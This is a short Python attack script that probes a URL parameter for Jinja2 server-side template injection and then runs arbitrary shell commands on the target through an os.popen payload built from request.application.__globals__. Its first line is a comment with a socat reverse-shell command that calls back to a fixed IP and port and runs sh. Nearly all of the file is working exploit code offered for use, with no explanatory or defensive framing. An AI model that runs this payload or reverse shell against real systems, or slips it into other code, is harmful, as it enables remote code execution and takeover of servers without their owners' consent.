# socat TCP:192.168.144.128:9999 EXEC:sh
import requests
import argparse
from urllib.parse import urlparse
import sys
import time


def url_validator(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc, result.path])
    except:
        return False


def payload_rce(cmd):
    return "{{request.application.__globals__.__builtins__.__import__('os').popen('#cmd#').read()}}".replace('#cmd#', cmd)


parser = argparse.ArgumentParser(description='Script auto detect SSTI')
parser.add_argument('--url', help='URL argument', required=True)
parser.add_argument('--cmd', help='Test command')
args = parser.parse_args()
url = args.url
if not url_validator(url):
    print('[+] URL invalid')
    sys.exit()

if not 'FUZZ' in url:
    print('[+] You haven\'t passed the parameter to fuzzing')
test_param = '13337'
test_payload = '''{{7*7}}'''
test_result = '49'
url2 = url.replace('FUZZ', test_param)
r = requests.get(url2)
test_response = r.text
url3 = url.replace('FUZZ', test_payload)
r = requests.get(url3)
test_response_payload = r.text
cmd = args.cmd
if test_response_payload == test_response.replace(test_param, test_result):
    if not cmd:
        print('[+] SSTI detected')
else:
    print('[+] SSTI not detected')
if cmd:
    print('[+] Running command')
    time.sleep(1)
    index_response_ssti_start = test_response.index(test_param)
    index_response_ssti_end = len(test_response) - \
        index_response_ssti_start - \
        len(test_param)
    r = requests.get(url.replace('FUZZ', payload_rce(cmd)))
    print(r.text[index_response_ssti_start:len(
        r.text)-index_response_ssti_end])
